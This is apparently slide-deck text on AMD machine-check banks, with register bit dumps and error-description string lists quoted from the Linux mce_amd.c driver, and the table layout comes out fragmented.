ctl (c0002050):
status (c0002051):
addr (c0002052):
misc0 (c0002053): xx x
config (c0002054):
ipid (c0002055):
synd (c0002056):
reserved (c0002057):
destat (c0002058):
deaddr (c0002059):
misc1 (c000205a):
misc2 (c000205b):
misc3 (c000205c):
misc4 (c000205d):
reserved (c000205e):
reserved (c000205f):
mask (c0010405):|5   5   4   4   4   3   3   2   2   2   1   1   0   0   0
6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
xxxxxxxxxxxxxxxxxxxxxxxx (          ffffff)
(               0)
(               0)
xx x                                                  (d01a000000000000)
x  xxx                       xxxxxxx x (      27000001fd)
x            x xx                                     (  1000b000000000)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
xxx                    (          380000)
5   5   4   4   4   3   3   2   2   2   1   1   0   0   0
6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
xxxxxxxxxxxxxxxxxxx (           7ffff)
(               0)
(               0)
xx x                                                  (d01a000000000000)
x   xx                       xxxxxx  x (      23000001f9)
x        x xx                                     (   100b000000000)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
x    x            (           10800)
5   5   4   4   4   3   3   2   2   2   1   1   0   0   0
6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
xxxx (               f)
(               0)
(               0)
xx x                                                  (d01a000000000000)
x  x x                       xxxxxxxxx (      25000001ff)
x         x xx                                     (   200b000000000)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
x    (               8)
5   5   4   4   4   3   3   2   2   2   1   1   0   0   0
6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
xxxxxxxxxx (             3ff)
(               0)
(               0)
xx x                                                  (d01a000000000000)
x   xx                       xxxxxx  x (      23000001f9)
xx        x xx                                     (   300b000000000)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
5   5   4   4   4   3   3   2   2   2   1   1   0   0   0
6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
5   5   4   4   4   3   3   2   2   2   1   1   0   0   0
6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
xxxxxxxxxxxxxx (            3fff)
(               0)
(               0)
xx x                                                  (d01a000000000000)
x   xx                       xxxxxx  x (      23000001f9)
x x        x xx                                     (   500b000000000)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
-

-

-

-

-

-

|-- extended bank 6 ---
6   5   5   4   4   4   3   3
0   6   2   8   4   0   6   2
ctl (c0002060):
status (c0002061):
addr (c0002062):
misc0 (c0002063): xx x       xx x
config (c0002064):                           x   xx
ipid (c0002065):              xx         x xx
synd (c0002066):
reserved (c0002067):
destat (c0002068):
deaddr (c0002069):
misc1 (c000206a):
misc2 (c000206b):
misc3 (c000206c):
misc4 (c000206d):
reserved (c000206e):
reserved (c000206f):
mask (c0010406):
-- extended bank 7 ---
6   5   5   4   4   4   3   3
0   6   2   8   4   0   6   2
ctl (c0002070):
status (c0002071):
addr (c0002072):
misc0 (c0002073): xx x       xx x
config (c0002074):                           x  x x
ipid (c0002075):              xxx        x xx
synd (c0002076):
reserved (c0002077):
destat (c0002078):
deaddr (c0002079):
misc1 (c000207a):            x
misc2 (c000207b):            x
misc3 (c000207c):            x
misc4 (c000207d):            x
reserved (c000207e):
reserved (c000207f):
mask (c0010407):
-- extended bank 8 ---
6   5   5   4   4   4   3   3
0   6   2   8   4   0   6   2
ctl (c0002080):
status (c0002081):
addr (c0002082):
misc0 (c0002083): xx x       xx x
config (c0002084):                           x  x x
ipid (c0002085):              xxx        x xx
synd (c0002086):
reserved (c0002087):
destat (c0002088):
deaddr (c0002089):
misc1 (c000208a):            x
misc2 (c000208b):            x
misc3 (c000208c):            x
misc4 (c000208d):            x
reserved (c000208e):
reserved (c000208f):
mask (c0010408):
-- extended bank 9 ---
6   5   5   4   4   4   3   3
0   6   2   8   4   0   6   2
ctl (c0002090):
status (c0002091):
addr (c0002092):
misc0 (c0002093): xx x       xx x
config (c0002094):                           x  x x
ipid (c0002095):              xxx        x xx
synd (c0002096):
reserved (c0002097):
destat (c0002098):
deaddr (c0002099):
misc1 (c000209a):            x
misc2 (c000209b):            x
misc3 (c000209c):            x
misc4 (c000209d):            x
reserved (c000209e):
reserved (c000209f):
mask (c0010409):
-- extended bank 10 ---
6   5   5   4   4   4   3   3
0   6   2   8   4   0   6   2
ctl (c00020a0):
status (c00020a1):
addr (c00020a2):
misc0 (c00020a3): xx x       xx x
config (c00020a4):                           x  x x
ipid (c00020a5):              xxx        x xx
synd (c00020a6):
reserved (c00020a7):
destat (c00020a8):
deaddr (c00020a9):
misc1 (c00020aa):            x
misc2 (c00020ab):            x
misc3 (c00020ac):            x
misc4 (c00020ad):            x
reserved (c00020ae):
reserved (c00020af):
mask (c001040a):
-- extended bank 11 ---
6   5   5   4   4   4   3   3
0   6   2   8   4   0   6   2
ctl (c00020b0):
status (c00020b1):
addr (c00020b2):
misc0 (c00020b3): xx x       xx x
config (c00020b4):                           x  x x
ipid (c00020b5):              xxx        x xx
synd (c00020b6):
reserved (c00020b7):
destat (c00020b8):
deaddr (c00020b9):
misc1 (c00020ba):            x
misc2 (c00020bb):            x
misc3 (c00020bc):            x
misc4 (c00020bd):            x
reserved (c00020be):
reserved (c00020bf):
mask (c001040b):|2   2   2   1   1   0   0   0
8   4   0   6   2   8   4   0
xxxxxxx (              7f)
(               0)
(               0)
(d01a000000000000)
xxxxxx  x (      23000001f9)
(   600b000000000)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
x       (              40)
2   2   2   1   1   0   0   0
8   4   0   6   2   8   4   0
xxxxxxxx (              ff)
(               0)
(               0)
(d01a000000000000)
xxxxxxxxx (      25000001ff)
(   700b000000000)
(               0)
(               0)
(               0)
(               0)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
x        (              80)
2   2   2   1   1   0   0   0
8   4   0   6   2   8   4   0
xxxxxxxx (              ff)
(               0)
(               0)
(d01a000000000000)
xxxxxxxxx (      25000001ff)
(   700b000000000)
(               0)
(               0)
(               0)
(               0)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
x        (              80)
2   2   2   1   1   0   0   0
8   4   0   6   2   8   4   0
xxxxxxxx (              ff)
(               0)
(               0)
(d01a000000000000)
xxxxxxxxx (      25000001ff)
(   700b000000000)
(               0)
(               0)
(               0)
(               0)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
x        (              80)
2   2   2   1   1   0   0   0
8   4   0   6   2   8   4   0
xxxxxxxx (              ff)
(               0)
(               0)
(d01a000000000000)
xxxxxxxxx (      25000001ff)
(   700b000000000)
(               0)
(               0)
(               0)
(               0)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
x        (              80)
2   2   2   1   1   0   0   0
8   4   0   6   2   8   4   0
xxxxxxxx (              ff)
(               0)
(               0)
(d01a000000000000)
xxxxxxxxx (      25000001ff)
(   700b000000000)
(               0)
(               0)
(               0)
(               0)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
x        (              80)
--- e

--- e

--- e

--- e

--- e

--- e

|xtended bank 12 ---
6   5   5   4   4   4   3   3   2   2   2   1   1   0   0   0
0   6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
ctl (c00020c0):                                                         xxxxxxxx (              ff)
status (c00020c1):                                                                  (               0)
addr (c00020c2):                                                                  (               0)
misc0 (c00020c3): xx x       xx x                                                  (d01a000000000000)
config (c00020c4):                           x  x x                       xxxxxxxxx (      25000001ff)
ipid (c00020c5):              xxx        x xx                                     (   700b000000000)
synd (c00020c6):                                                                  (               0)
reserved (c00020c7):                                                                  (               0)
destat (c00020c8):                                                                  (               0)
deaddr (c00020c9):                                                                  (               0)
misc1 (c00020ca):            x                                                     (  10000000000000)
misc2 (c00020cb):            x                                                     (  10000000000000)
misc3 (c00020cc):            x                                                     (  10000000000000)
misc4 (c00020cd):            x                                                     (  10000000000000)
reserved (c00020ce):                                                                  (               0)
reserved (c00020cf):                                                                  (               0)
mask (c001040c):                                                         x        (              80)
xtended bank 13 ---
6   5   5   4   4   4   3   3   2   2   2   1   1   0   0   0
0   6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
ctl (c00020d0):                                                         xxxxxxxx (              ff)
status (c00020d1):                                                                  (               0)
addr (c00020d2):                                                                  (               0)
misc0 (c00020d3): xx x       xx x                                                  (d01a000000000000)
config (c00020d4):                           x  x x                       xxxxxxxxx (      25000001ff)
ipid (c00020d5):              xxx        x xx                                     (   700b000000000)
synd (c00020d6):                                                                  (               0)
reserved (c00020d7):                                                                  (               0)
destat (c00020d8):                                                                  (               0)
deaddr (c00020d9):                                                                  (               0)
misc1 (c00020da):            x                                                     (  10000000000000)
misc2 (c00020db):            x                                                     (  10000000000000)
misc3 (c00020dc):            x                                                     (  10000000000000)
misc4 (c00020dd):            x                                                     (  10000000000000)
reserved (c00020de):                                                                  (               0)
reserved (c00020df):                                                                  (               0)
mask (c001040d):                                                         x        (              80)
xtended bank 14 ---
6   5   5   4   4   4   3   3   2   2   2   1   1   0   0   0
0   6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
ctl (c00020e0):                                                         xxxxxxxx (              ff)
status (c00020e1):                                                                  (               0)
addr (c00020e2):                                                                  (               0)
misc0 (c00020e3): xx x       xx x                                                  (d01a000000000000)
config (c00020e4):                           x  x x                       xxxxxxxxx (      25000001ff)
ipid (c00020e5):              xxx        x xx                                     (   700b000000000)
synd (c00020e6):                                                                  (               0)
reserved (c00020e7):                                                                  (               0)
destat (c00020e8):                                                                  (               0)
deaddr (c00020e9):                                                                  (               0)
misc1 (c00020ea):            x                                                     (  10000000000000)
misc2 (c00020eb):            x                                                     (  10000000000000)
misc3 (c00020ec):            x                                                     (  10000000000000)
misc4 (c00020ed):            x                                                     (  10000000000000)
reserved (c00020ee):                                                                  (               0)
reserved (c00020ef):                                                                  (               0)
mask (c001040e):                                                         x        (              80)
xtended bank 15 ---
6   5   5   4   4   4   3   3   2   2   2   1   1   0   0   0
0   6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
ctl (c00020f0):                                                                  (               0)
status (c00020f1):                                                                  (               0)
addr (c00020f2):                                                                  (               0)
misc0 (c00020f3):            x                                                     (  10000000000000)
config (c00020f4):                                                                  (               0)
ipid (c00020f5):                                                                  (               0)
synd (c00020f6):                                                                  (               0)
reserved (c00020f7):                                                                  (               0)
destat (c00020f8):                                                                  (               0)
deaddr (c00020f9):                                                                  (               0)
misc1 (c00020fa):            x                                                     (  10000000000000)
misc2 (c00020fb):            x                                                     (  10000000000000)
misc3 (c00020fc):            x                                                     (  10000000000000)
misc4 (c00020fd):            x                                                     (  10000000000000)
reserved (c00020fe):                                                                  (               0)
reserved (c00020ff):                                                                  (               0)
mask (c001040f):                                                                  (               0)
xtended bank 16 ---
6   5   5   4   4   4   3   3   2   2   2   1   1   0   0   0
0   6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
ctl (c0002100):                                                                  (               0)
status (c0002101):                                                                  (               0)
addr (c0002102):                                                                  (               0)
misc0 (c0002103):            x                                                     (  10000000000000)
config (c0002104):                                                                  (               0)
ipid (c0002105):                                                                  (               0)
synd (c0002106):                                                                  (               0)
reserved (c0002107):                                                                  (               0)
destat (c0002108):                                                                  (               0)
deaddr (c0002109):                                                                  (               0)
misc1 (c000210a):            x                                                     (  10000000000000)
misc2 (c000210b):            x                                                     (  10000000000000)
misc3 (c000210c):            x                                                     (  10000000000000)
misc4 (c000210d):            x                                                     (  10000000000000)
reserved (c000210e):                                                                  (               0)
reserved (c000210f):                                                                  (               0)
mask (c0010410):                                                                  (               0)
xtended bank 17 ---
6   5   5   4   4   4   3   3   2   2   2   1   1   0   0   0
0   6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
ctl (c0002110):                                                           xxxxxx (              3f)
status (c0002111):                                                                  (               0)
addr (c0002112):                                                                  (               0)
misc0 (c0002113): xx x       xx x                        x                         (d01a000001000000)
config (c0002114):                           x  xxx                         xxxxx x (      270000007d)
ipid (c0002115):                         x  x xx              x x    xxxx         (      9600050f00)
synd (c0002116):                                                                  (               0)
reserved (c0002117):                                                                  (               0)
destat (c0002118):                                                                  (               0)
deaddr (c0002119):                                                                  (               0)
misc1 (c000211a): xx x       xx x                        x                         (d01a000001000000)
misc2 (c000211b):            x                                                     (  10000000000000)
misc3 (c000211c):            x                                                     (  10000000000000)
misc4 (c000211d):            x                                                     (  10000000000000)
reserved (c000211e):                                                                  (               0)
reserved (c000211f):                                                                  (               0)
mask (c0010411):                                                                  (               0)
--- ex

--- ex

--- ex

--- ex

--- ex

--- ex

|tended bank 18 ---
6   5   5   4   4   4
0   6   2   8   4   0
ctl (c0002120):
status (c0002121):
addr (c0002122):
misc0 (c0002123): xx x       xx x
config (c0002124):
ipid (c0002125):                         x
synd (c0002126):
reserved (c0002127):
destat (c0002128):
deaddr (c0002129):
misc1 (c000212a): xx x       xx x
misc2 (c000212b):            x
misc3 (c000212c):            x
misc4 (c000212d):            x
reserved (c000212e):
reserved (c000212f):
mask (c0010412):
tended bank 19 ---
6   5   5   4   4   4
0   6   2   8   4   0
ctl (c0002130):
status (c0002131):
addr (c0002132):
misc0 (c0002133): xx x       xx x
config (c0002134):
ipid (c0002135):               x
synd (c0002136):
reserved (c0002137):
destat (c0002138):
deaddr (c0002139):
misc1 (c000213a):            x
misc2 (c000213b):            x
misc3 (c000213c):            x
misc4 (c000213d):            x
reserved (c000213e):
reserved (c000213f):
mask (c0010413):
tended bank 20 ---
6   5   5   4   4   4
0   6   2   8   4   0
ctl (c0002140):
status (c0002141):
addr (c0002142):
misc0 (c0002143): xx x       xx x
config (c0002144):
ipid (c0002145):               x
synd (c0002146):
reserved (c0002147):
destat (c0002148):
deaddr (c0002149):
misc1 (c000214a):            x
misc2 (c000214b):            x
misc3 (c000214c):            x
misc4 (c000214d):            x
reserved (c000214e):
reserved (c000214f):
mask (c0010414):
tended bank 21 ---
6   5   5   4   4   4
0   6   2   8   4   0
ctl (c0002150):
status (c0002151):
addr (c0002152):
misc0 (c0002153):            x
config (c0002154):
ipid (c0002155):
synd (c0002156):
reserved (c0002157):
destat (c0002158):
deaddr (c0002159):
misc1 (c000215a):            x
misc2 (c000215b):            x
misc3 (c000215c):            x
misc4 (c000215d):            x
reserved (c000215e):
reserved (c000215f):
mask (c0010415):
tended bank 22 ---
6   5   5   4   4   4
0   6   2   8   4   0
ctl (c0002160):
status (c0002161):
addr (c0002162):
misc0 (c0002163):            x
config (c0002164):
ipid (c0002165):
synd (c0002166):
reserved (c0002167):
destat (c0002168):
deaddr (c0002169):
misc1 (c000216a):            x
misc2 (c000216b):            x
misc3 (c000216c):            x
misc4 (c000216d):            x
reserved (c000216e):
reserved (c000216f):
mask (c0010416):
tended bank 23 ---
6   5   5   4   4   4
0   6   2   8   4   0
ctl (c0002170):
status (c0002171):
addr (c0002172):
misc0 (c0002173):            x
config (c0002174):
ipid (c0002175):
synd (c0002176):
reserved (c0002177):
destat (c0002178):
deaddr (c0002179):
misc1 (c000217a):            x
misc2 (c000217b):            x
misc3 (c000217c):            x
misc4 (c000217d):            x
reserved (c000217e):
reserved (c000217f):
mask (c0010417):|3   3   2   2   2   1   1   0   0   0
6   2   8   4   0   6   2   8   4   0
xxxxxx (              3f)
(               0)
(               0)
x                         (d01a000001000000)
x  xxx                         xxxxx x (      270000007d)
x xx            x x x    xxxx         (      9600150f00)
(               0)
(               0)
(               0)
(               0)
x                         (d01a000001000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
(               0)
3   3   2   2   2   1   1   0   0   0
6   2   8   4   0   6   2   8   4   0
xxxxxxxxxxxxxx (            3fff)
(               0)
(               0)
(d01a000000000000)
x  x x                         xxxxxxx (      250000007f)
x xxx                                  (   2002e00000000)
(               0)
(               0)
(               0)
(               0)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
x  (               2)
3   3   2   2   2   1   1   0   0   0
6   2   8   4   0   6   2   8   4   0
xxxxxxxxxxxxxx (            3fff)
(               0)
(               0)
(d01a000000000000)
x  x x                         xxxxxxx (      250000007f)
x xxx                                x (   2002e00000001)
(               0)
(               0)
(               0)
(               0)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
x  (               2)
3   3   2   2   2   1   1   0   0   0
6   2   8   4   0   6   2   8   4   0
(               0)
(               0)
(               0)
(  10000000000000)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
(               0)
3   3   2   2   2   1   1   0   0   0
6   2   8   4   0   6   2   8   4   0
(               0)
(               0)
(               0)
(  10000000000000)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
(               0)
3   3   2   2   2   1   1   0   0   0
6   2   8   4   0   6   2   8   4   0
(               0)
(               0)
(               0)
(  10000000000000)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
(               0)
--

--

--

--

--

--

|- extended bank 24 ---
6   5   5
0   6   2
ctl (c0002180):
status (c0002181):
addr (c0002182):
misc0 (c0002183):            x
config (c0002184):
ipid (c0002185):
synd (c0002186):
reserved (c0002187):
destat (c0002188):
deaddr (c0002189):
misc1 (c000218a):            x
misc2 (c000218b):            x
misc3 (c000218c):            x
misc4 (c000218d):            x
reserved (c000218e):
reserved (c000218f):
mask (c0010418):
- extended bank 25 ---
6   5   5
0   6   2
ctl (c0002190):
status (c0002191):
addr (c0002192):
misc0 (c0002193):            x
config (c0002194):
ipid (c0002195):
synd (c0002196):
reserved (c0002197):
destat (c0002198):
deaddr (c0002199):
misc1 (c000219a):            x
misc2 (c000219b):            x
misc3 (c000219c):            x
misc4 (c000219d):            x
reserved (c000219e):
reserved (c000219f):
mask (c0010419):
- extended bank 26 ---
6   5   5
0   6   2
ctl (c00021a0):
status (c00021a1):
addr (c00021a2):
misc0 (c00021a3):            x
config (c00021a4):
ipid (c00021a5):
synd (c00021a6):
reserved (c00021a7):
destat (c00021a8):
deaddr (c00021a9):
misc1 (c00021aa):            x
misc2 (c00021ab):            x
misc3 (c00021ac):            x
misc4 (c00021ad):            x
reserved (c00021ae):
reserved (c00021af):
mask (c001041a):
- extended bank 27 ---
6   5   5
0   6   2
ctl (c00021b0):
status (c00021b1):
addr (c00021b2):
misc0 (c00021b3): xx x       xx
config (c00021b4):
ipid (c00021b5):
synd (c00021b6):
reserved (c00021b7):
destat (c00021b8):
deaddr (c00021b9):
misc1 (c00021ba):            x
misc2 (c00021bb):            x
misc3 (c00021bc):            x
misc4 (c00021bd):            x
reserved (c00021be):
reserved (c00021bf):
mask (c001041b):
- extended bank 28 ---
6   5   5
0   6   2
ctl (c00021c0):
status (c00021c1):
addr (c00021c2):
misc0 (c00021c3):
config (c00021c4):
ipid (c00021c5):
synd (c00021c6):
reserved (c00021c7):
destat (c00021c8):
deaddr (c00021c9):
misc1 (c00021ca):
misc2 (c00021cb):
misc3 (c00021cc):
misc4 (c00021cd):
reserved (c00021ce):
reserved (c00021cf):
mask (c001041c):
- extended bank 29 ---
6   5   5
0   6   2
ctl (c00021d0):
status (c00021d1):
addr (c00021d2):
misc0 (c00021d3):
config (c00021d4):
ipid (c00021d5):
synd (c00021d6):
reserved (c00021d7):
destat (c00021d8):
deaddr (c00021d9):
misc1 (c00021da):
misc2 (c00021db):
misc3 (c00021dc):
misc4 (c00021dd):
reserved (c00021de):
reserved (c00021df):
mask (c001041d):|4   4   4   3   3   2   2   2   1   1   0   0   0
8   4   0   6   2   8   4   0   6   2   8   4   0
(               0)
(               0)
(               0)
(  10000000000000)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
(               0)
4   4   4   3   3   2   2   2   1   1   0   0   0
8   4   0   6   2   8   4   0   6   2   8   4   0
(               0)
(               0)
(               0)
(  10000000000000)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
(               0)
4   4   4   3   3   2   2   2   1   1   0   0   0
8   4   0   6   2   8   4   0   6   2   8   4   0
(               0)
(               0)
(               0)
(  10000000000000)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
(               0)
4   4   4   3   3   2   2   2   1   1   0   0   0
8   4   0   6   2   8   4   0   6   2   8   4   0
xxxxx (              1f)
(               0)
(               0)
x                                                  (d01a000000000000)
x  xxx                         xxxxx x (      270000007d)
x          x xxx                             x xx (   1002e0000000b)
(               0)
(               0)
(               0)
(               0)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
(               0)
4   4   4   3   3   2   2   2   1   1   0   0   0
8   4   0   6   2   8   4   0   6   2   8   4   0
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
4   4   4   3   3   2   2   2   1   1   0   0   0
8   4   0   6   2   8   4   0   6   2   8   4   0
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)|
|---|---|---|---|---|---|---|---|---|

## Slide 69

static const char * const f15h_mc1_mce_desc[] = { "UC during a demand linefill from L2", "Parity error during data load from IC", "Parity error for IC valid bit", "Main tag parity error", "Parity error in prediction queue", "PFB data/address parity error", "Parity error in the branch status reg", "PFB promotion address error", "Tag error during probe/victimization", "Parity error for IC probe tag valid bit", "PFB non-cacheable bit parity error", "PFB valid bit parity error", /* xec = 0xd */ "Microcode Patch Buffer", /* xec = 010 */ "uop queue", "insn buffer", "predecode buffer", "fetch address FIFO", "dispatch uop queue" };

# generating MCEs

source:https://github.com/torvalds/linux/blob/master/drivers/edac/mce_amd.c

## Slide 70

static const char * const f15h_mc2_mce_desc[] = { "Fill ECC error on data fills", /* xec = 0x4 */ "Fill parity error on insn fills", "Prefetcher request FIFO parity error", "PRQ address parity error", "PRQ data parity error", "WCC Tag ECC error", "WCC Data ECC error", "WCB Data parity error", "VB Data ECC or parity error", "L2 Tag ECC error", /* xec = 0x10 */ "Hard L2 Tag ECC error", "Multiple hits on L2 tag", "XAB parity error", "PRB address parity error" };

generating MCEs

source:https://github.com/torvalds/linux/blob/master/drivers/edac/mce_amd.c

## Slide 71

static const char * const mc4_mce_desc[] = { "DRAM ECC error detected on the NB", "CRC error detected on HT link", "Link-defined sync error packets detected on HT link", "HT Master abort", "HT Target abort", "Invalid GART PTE entry during GART table walk", "Unsupported atomic RMW received from an IO link", "Watchdog timeout due to lack of progress", "DRAM ECC error detected on the NB", "SVM DMA Exclusion Vector error", "HT data error detected on link", "Protocol error (link, L3, probe filter)", "NB internal arrays parity error", "DRAM addr/ctl signals parity error", "IO link transmission error", "L3 data cache ECC error", /* xec = 0x1c */ "L3 cache tag error", "L3 LRU parity bits error", "ECC Error in the Probe Filter directory" };

# generating MCEs

source:https://github.com/torvalds/linux/blob/master/drivers/edac/mce_amd.c

## Slide 72

static const char * const mc5_mce_desc[] = { "CPU Watchdog timer expire", "Wakeup array dest tag", "AG payload array", "EX payload array", "IDRF array", "Retire dispatch queue", "Mapper checkpoint array", "Physical register file EX0 port", "Physical register file EX1 port", "Physical register file AG0 port", "Physical register file AG1 port", "Flag register file", "DE error occurred", "Retire status queue" };

generating MCEs

source:https://github.com/torvalds/linux/blob/master/drivers/edac/mce_amd.c

## Slide 73

static const char * const mc6_mce_desc[] = { "Hardware Assertion", "Free List", "Physical Register File", "Retire Queue", "Scheduler table", "Status Register File", };

generating MCEs

source:https://github.com/torvalds/linux/blob/master/drivers/edac/mce_amd.c

## Slide 74

"Load queue parity" "Store queue parity" "Miss address buffer payload parity" "L1 TLB parity" "DC Tag error type 5" "DC tag error type 6" "DC tag error type 1" "Internal error type 1" "Internal error type 2" "Sys Read data error thread 0" "Sys read data error thread 1" "DC tag error type 2" "DC data error type 1 (poison consumption)" "DC data error type 2" "DC data error type 3" "DC tag error type 4" "L2 TLB parity" "PDC parity error" "DC tag error type 3" "DC tag error type 5" "L2 fill data error" "Error on SCB cacheline state or address field" "Error on SCB data, commit pipe 0" "Error on SCB data, commit pipe 1" "Error on SCB data for non-cacheable DRAM or IO" "System Read Data Error detected by write combine buffer" "Hardware Asserts" "An ECC error was detected on a data cache read by a probe or victimization" "An ECC error or L2 poison was detected on a data cache read by a load" "An ECC error was detected on a data cache read-modify-write by a store" "An ECC error or poison bit mismatch was detected on a tag read by a probe or victimization" "An ECC error or poison bit mismatch was detected on a tag read by a load" "An ECC error or poison bit mismatch was detected on a tag read by a store" "An ECC error was detected on an EMEM read by a load" "An ECC error was detected on an EMEM read-modify-write by a store" "A parity error was detected in an L1 TLB entry by any access" "A parity error was detected in an L2 TLB entry by any access" "A parity error was detected in a PWC entry by any access" "A parity error was detected in an STQ entry by any access" "A parity error was detected in an LDQ entry by any access" "A parity error was detected in a MAB entry by any access" "A parity error was detected in an SCB entry state field by any access" "A parity error was detected in an SCB entry address field by any access" "A parity error was detected in an SCB entry data field by any access" "A parity error was detected in a WCB entry by any access" "A poisoned line was detected in an SCB entry by any access" "A SystemReadDataError error was reported on read data returned from L2 for a load" "A SystemReadDataError error was reported on read data returned from L2 for an SCB store" "A SystemReadDataError error was reported on read data returned from L2 for a WCB store" "A hardware assertion error was reported" "A parity error was detected in an STLF, SCB EMEM entry, store data mask or SRB store data by any access" "microtag probe port parity error" "IC microtag or full tag multi-hit error" "IC full tag parity" "IC data array parity" "PRQ Parity Error" "L0 ITLB parity error" "L1-TLB parity error" "L2-TLB parity error" "BPQ snoop parity on Thread 0" "BPQ snoop parity on Thread 1" "BP L1-BTB Multi-Hit Error" "BP L2-BTB Multi-Hit Error" "L2 Cache Response Poison error" "System Read Data error" "Hardware Assertion Error" "L1-TLB Multi-Hit" "L2-TLB Multi-Hit" "BSR Parity Error" "CT MCE" "L2M Tag Multiple-Way-Hit error" "L2M Tag or State Array ECC Error" "L2M Data Array ECC Error" "Hardware Assert Error" "SDP Read Response Parity Error" "Error initiated by programmable state machine" "Micro-op cache tag array parity error" "Micro-op cache data array parity error" "IBB Register File parity error" "Micro-op queue parity error" "Instruction dispatch queue parity error" "Fetch address FIFO parity error" "Patch RAM data parity error" "Patch RAM sequencer parity error" "Micro-op fetch queue parity error" "Hardware Assertion MCA Error" "Watchdog timeout error" "Physical register file parity error" "Flag register file parity error" "Immediate displacement register file parity error" "Address generator payload parity error" "EX payload parity error" "Checkpoint queue parity error" "Retire dispatch queue parity error" "Retire status queue parity error" "Scheduler queue parity error" "Branch buffer queue parity error" "Hardware Assertion error" "Spec Map parity error" "Retire Map parity error" "Physical register file (PRF) parity error" "Freelist (FL) parity error" "Schedule queue parity error" "NSQ parity error" "Retire queue (RQ) parity error" "Status register file (SRF) parity error" "Hardware assertion" "Physical K mask register file (KRF) parity error" "Shadow tag macro ECC error" "Shadow tag macro multi-way-hit error" "L3M tag ECC error" "L3M tag multi-way-hit error" "L3M data ECC error" "SDP Parity Error from XI" "L3 victim queue Data Fabric error" "L3 Hardware Assertion" "XI WCB Parity Poison Creation event" "Machine check error initiated by DSM action" "Illegal request" "Address violation" "Security violation" "Illegal response" "Unexpected response" "Request or Probe Parity Error" "Read Response Parity Error" "Atomic request parity error" "Probe Filter ECC Error" "Illegal Request" "Address Violation" "Security Violation" "Illegal Response" "Unexpected Response" "Request or Probe Parity Error" "Read Response Parity Error" "Atomic Request Parity Error" "SDP read response had no match in the CS queue" "Probe Filter Protocol Error" "Probe Filter ECC Error" "SDP read response had an unexpected RETRY error" "Counter overflow error" "Counter underflow error" "Illegal Request on the no data channel" "Address Violation on the no data channel" "Security Violation on the no data channel" "Hardware Assert Error" "Shadow Tag Array Protocol Error" "Shadow Tag ECC Error" "Shadow Tag Transaction Error" "Illegal Request" "Address Violation" "Security Violation" "Illegal Response" "Unexpected Response" "Request or Probe Parity Error" "Read Response Parity Error" "Atomic Request Parity Error" "SDP read response had no match in the CS queue" "SDP read response had an unexpected RETRY error" "Counter overflow error" "Counter underflow error" "Probe Filter Protocol Error" "Probe Filter ECC Error" "Illegal Request on the no data channel" "Address Violation on the no data channel" "Security Violation on the no data channel" "Hardware Assert Error" "Hardware assert" "Register security violation" "Link error" "Poison data consumption" "A deferred error was detected in the DF" "Watch Dog Timer" "An SRAM ECC error was detected in the CNLI block" "Register access during DF Cstate" "DSM Error" "DRAM ECC error" "Data poison error on DRAM" "SDP parity error" "Advanced peripheral bus error" "Command/address parity error" "Write data CRC error" "DCQ SRAM ECC error" "AES SRAM ECC error" "ECS Row Error" "ECS Error" "UMC Throttling Error" "Read CRC Error" "Reserved" "Reserved" "Reserved" "Reserved" "RFM SRAM ECC error" "DRAM On Die ECC error" "Data poison error" "SDP parity error" "Reserved" 